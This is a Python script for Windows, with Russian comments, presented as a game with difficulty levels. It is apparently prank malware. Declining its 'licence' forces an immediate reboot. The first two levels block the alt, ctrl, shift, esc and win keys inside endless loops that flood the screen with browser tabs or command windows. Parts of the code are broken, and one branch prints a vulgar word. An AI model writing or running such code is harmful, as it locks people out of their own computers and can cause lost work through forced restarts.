#ИМПОРТЫ
import subprocess
import webbrowser
import keyboard
import time
import os
import random
import win32gui
from win32api import GetSystemMetrics
# from pygame import mixer 
# import pygame

#ФОНОВАЯ МУЗЫКА

# pygame.mixer.init()
# pygame.mixer.music.load('fone_music.mp3')
# pygame.mixer.music.play(-1)

#МАССИВЫ и СПИСКИ
lvl2 = True
lvl1 = True
playername = input("Введите ваше имя:")
otvetnet = ["НЕТ","NO","no","нет","No","nO","Нет","НЕт","НеТ","нЕТ","неТ","нЕт"]
otvetda = ["Да","ДА","да","дА","Yes","YEs","YES","yes","yEs","YeS","yeS"] 
boollic = True

lic = input("Вы соглашаетесь с тем что разработчик не несет ответсвенность за ваши действия?(Да\Нет):")
if lic in otvetnet:
    print('Отказано в доступе!(no pass licence)')
    time.sleep(2.2)
    subprocess.call(["shutdown", "-r", "-t", "0"])
elif lic in otvetda:
                
#УРОВНИ РАБОТЫ

    lvl = int(input("Выбирите сложность(1,2,3):"))
    
    #УРОВЕНЬ 1
 
    if lvl == 1:
        while lvl1:
                keyboard.block_key("alt","ctrl","shift","esc","win","alt"and"F4")
                webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")

#УРОВЕНЬ 2

    elif lvl == 2:
        while lvl2:
            keyboard.block_key("alt")
            keyboard.block_key("ctrl")
            keyboard.block_key("shift")
            keyboard.block_key("esc")
            keyboard.block_key("win")
            keyboard.block_key("alt"and"F4")
            _Scr_Width = GetSystemMetrics(0)
            _Scr_Height = GetSystemMetrics(1)
            num_windows = 1
            for i in range(num_windows):
                os.system
                (
                    f'start "win (i)" '
                    f'cmd /c "cd /windows'
                    f' && dir /s"'
                    f'color a4'
                )
            time.sleep(0.2)
            handle = win32gui.FindWindow
            (
            0, f'win {i}'
            )
            win32gui.MoveWindow
            (
                handle,
                random.randrange(_Scr_Width),
                random.randrange(_Scr_Height),
                700, 400, True
            )
        
            

#УРОВЕНЬ 3           

    elif lvl == 3:
        os.startfile(r'C:\\Users\\User\Desktop\snakee-dev\lvl3.py')            

#СЛУЧАЙ ВВОДА НЕИЗВЕСТНОЙ ПЕРЕМЕННОЙ В КОНСОЛЬ 

else:
        print('cumshot')
